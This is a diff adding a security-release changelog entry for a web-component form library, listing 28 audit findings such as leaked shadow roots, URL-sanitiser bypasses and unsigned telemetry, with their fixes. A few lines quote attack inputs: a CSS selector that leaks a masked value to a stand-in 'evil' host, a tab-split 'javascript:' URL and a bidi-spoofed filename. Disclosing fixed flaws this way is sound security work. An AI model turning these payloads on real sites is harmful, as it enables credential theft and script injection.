@@ -7,6 +7,155 @@ Versioning follows [Semantic Versioning](https://semver.org/spec/v2.0.0.html).
 
 ---
 
+## [0.5.0] — 2026-09-14
+
+Security release. A full audit of the package found that three of the four
+foundational invariants — the closed shadow root, tier immutability, and the
+card component's CRITICAL lock — were not enforced at runtime. All 28 findings
+are fixed. Every fix carries a regression test that reproduces the original
+attack.
+
+**Root cause behind several of these:** TypeScript's `protected` is erased at
+compile time, so every `protected` member of `SecureBaseComponent` shipped as an
+ordinary public prototype method.
+
+### Breaking Changes
+
+- **`element.root` removed.** The closed shadow root is no longer reachable from
+  page script. `protected get root()` compiled to a public getter, so
+  `el.root.querySelector('input').value` returned the real password of a masked
+  CRITICAL field and the raw PAN and CVC of a `<secure-card>`. The privileged
+  surface now lives in a module-scoped `WeakMap` — not a `Symbol`, which
+  `Object.getOwnPropertySymbols` would reveal.
+- **The rest of the privileged surface is withdrawn from the prototype** —
+  `initializeSecurity`, `addComponentStyles`, `getBaseStylesheetUrl`, `audit`,
+  `clearAuditLog`, `checkRateLimit`, `detectInjection`, `rerender`,
+  `recordTelemetryFocus`, `recordTelemetryInput`, `recordTelemetryBlur`,
+  `setupAutofillDetection`. `addComponentStyles()` in particular injected CSS
+  into the closed shadow root, which a strict CSP does **not** block, enabling
+  `input[value^="a"]{background:url(//evil/a)}` exfiltration of a masked value.
+  The public API (`value`, `valid`, `securityTier`, `config`, `getAuditLog`,
+  `reportError`, `clearExternalError`, `getFieldTelemetry`) is unchanged.
+- **`security-tier` is genuinely write-once.** A blocked change now also reverts
+  the DOM attribute, because every tier badge and border is a
+  `:host([security-tier="…"])` rule — leaving it poisoned repainted a CRITICAL
+  field as public, or a public one as critical.
+- **Masked values are never written to the light DOM.** `<secure-input>` at a
+  masking tier, and `<secure-password-confirm>` in all cases, no longer create a
+  hidden input outside a `<secure-form>`; one `document.querySelector` read the
+  cleartext otherwise. Wrap the field in `<secure-form>` for native submission.
+- **`SignedTelemetryEnvelope` gained `v`, `telemetryDigest` and `boundTo`.** The
+  signature previously covered only `environment`, and nothing bound an envelope
+  to a submission, so a genuine envelope harvested from a real browser verified
+  against an automated submission claiming `riskScore: 0`. The payload is now a
+  canonical serialization (recursively sorted keys) so a server that re-serializes
+  the JSON reproduces the same bytes.
+- **`validation_failed` audit detail changed** — `{ errors, valueLength }` is now
+  `{ errorCount, lengthBucket }`. The old shape broadcast the exact character
+  count and the specific failure reasons of SENSITIVE and CRITICAL values to
+  every listener on the page.
+- **`<secure-table>` no longer renders HTML pass-through for masked columns.** A
+  `data-tier="critical"` or `"sensitive"` column is masked first, unconditionally.
+
+### Security
+
+- **`<secure-table>` URL sanitiser rewritten to a scheme allowlist.** The
+  denylist regex required a contiguous scheme; browsers strip TAB, LF and CR from
+  *inside* a scheme before parsing, so `java&#9;script:alert(1)` survived and was
+  re-serialized with the raw TAB intact. Only `http`, `https`, `mailto`, `tel`
+  and schemeless URLs are kept.
+- **`<secure-table>` tier masking applied before HTML pass-through.**
+  `#parseSlottedTable` creates a `_html` key for any cell containing a `<`, so a
+  CRITICAL SSN column rendered in full whenever the server wrapped it in a
+  `<span>`.
+- **`<secure-table>` masked tail is escaped.** The SENSITIVE branch returned the
+  trailing four characters unescaped into an `innerHTML` sink.
+- **`<secure-form>` validates a server-rendered form's own `action`.** On the
+  progressive-enhancement path the adopted `<form>`'s `action` was never checked,
+  and the CSRF token was then injected into it — full credential exfiltration to
+  an attacker origin. The action is re-validated again immediately before native
+  submission.
+- **Threat state is keyed by the emitting element.** `secure-threat-detected` and
+  `secure-threat-cleared` are `{bubbles, composed}`, so any descendant could
+  forge a `secure-threat-cleared` naming a flagged field and lift the injection
+  block with the payload still in place.
+- **`<secure-file-upload>` fails closed on an unrecognised `accept`.** Extensions
+  with no MIME mapping were dropped silently; if all of them were unmapped
+  (`accept=".webp,.avif"`) the allowlist was empty and the type check was skipped
+  entirely, accepting `.html`, `.svg` and `.exe`.
+- **`accept="image/*"` no longer re-admits SVG.** An explicit deny set for
+  `image/svg+xml`, `text/html` and the XML family is applied after every allow
+  path, including wildcards.
+- **Filenames containing bidirectional overrides or control characters are
+  rejected** — `invoice<RLO>fdp.exe` rendered as `invoiceexe.pdf`.
+- **`<secure-card>` CRITICAL lock implemented.** It was documented but absent, so
+  `<secure-card security-tier="public">` demoted a payment field from markup.
+- **Fallback-input neutralisation moved to the base class.** Only
+  `<secure-input>` did it, so for textarea, select and datetime the light-DOM
+  fallback kept its `name` — and `#collectFormData` collects raw light-DOM
+  controls *after* the secure components, under the same key, overwriting the
+  value the user actually typed with stale server-rendered content.
+- **Password and confirm boxes use distinct threat keys.** Both passed the same
+  field name, so a clean keystroke in the confirm box cleared the flag raised by
+  the password box.
+- **Audit entries are frozen and dispatched as copies.** The same object was both
+  retained and placed in the event detail, so a listener could rewrite history in
+  place.
+- **`getTierConfig()` guards with `isValidTier`.** A truthiness check on an
+  inherited-property lookup meant `getTierConfig('constructor')` returned the
+  `Object` constructor rather than the CRITICAL config.
+- **`component_disconnected` is loggable again.** Substring matching in the audit
+  gate had no branch matching it, so component teardown was never recorded at any
+  tier. Replaced with an explicit event-to-gate table.
+
+### Fixed
+
+- **The signed telemetry envelope now reaches the server.** The provider awaited
+  SubtleCrypto inside a synchronous `dispatchEvent`, so `SecureForm` had already
+  run `JSON.stringify` by the time `_env` was attached. Every submission was
+  silently unsigned while appearing to be signed.
+- **`<secure-form>` recognises `<secure-password-confirm>` and validates
+  `<secure-card>`.** Neither appeared in the validation or collection selectors:
+  password match and strength were never enforced, and inside a `<secure-form>`
+  the password was never submitted at all while the form reported success.
+- **One missing `CSS.escape()`** in `#syncSecureInputsToForm` — a crafted field
+  name redirected the write to another field's hidden input, or threw and aborted
+  the sync mid-way while the native path submitted anyway.
+- **Whitespace-only CSRF tokens are treated as absent.** `!" "` is `false`, so a
+  template rendering an empty token turned a fail-closed tier into fail-open.
+- **`<secure-table>` binds its action listener once.** `#updateTableContent`
+  replaces only the inner HTML, so the container survived and each call added
+  another closure: eight search keystrokes then one "delete" click fired nine
+  `secure-table-action` events — nine real deletions from one user click.
+- **`build/bundler.js` replacement-pattern injection.** `String.prototype.replaceAll`
+  interprets `$$`, `$&`, ``$` `` and `$'` in a replacement string, so a `$'` in
+  any component stylesheet spliced the remainder of the TypeScript source into
+  the generated template literal — producing a bundle whose JS differed from the
+  reviewed source, after review.
+
+### CI / Supply chain
+
+- **The build now runs before the tests.** `tests/build/` skips itself when
+  `dist/` is missing, and CI ran the tests first — so all 66 build-artifact
+  assertions became skips and CI reported green having executed none of them.
+  The suite now throws rather than skipping when `dist/` is absent under `CI`.
+- **The published root manifest is asserted too.** The `./base-component`
+  assertions covered only `dist/package.json`; npm publishes the root one.
+- **CycloneDX SBOM** committed as `sbom.json`, generated by `npm run sbom` and
+  kept honest by `npm run sbom:check`, which fails when it drifts from the
+  dependency tree. Wired into CI and `prepublishOnly`. Zero runtime components.
+- **`SECURITY.md` and `sbom.json` ship in the published tarball.**
+- `prepublishOnly` now also runs `audit:check` and `sbom:check`.
+
+### Tests
+
+- 1288 tests across 30 files, plus 69 build-artifact assertions.
+- New: `tests/core/encapsulation-invariants.test.ts` and
+  `tests/core/audit-regressions.test.ts` — each test reproduces the original
+  attack, with a control proving the neighbouring legitimate case still works.
+
+---
+
 ## [0.4.2] — 2026-06-05
 
 ### Security
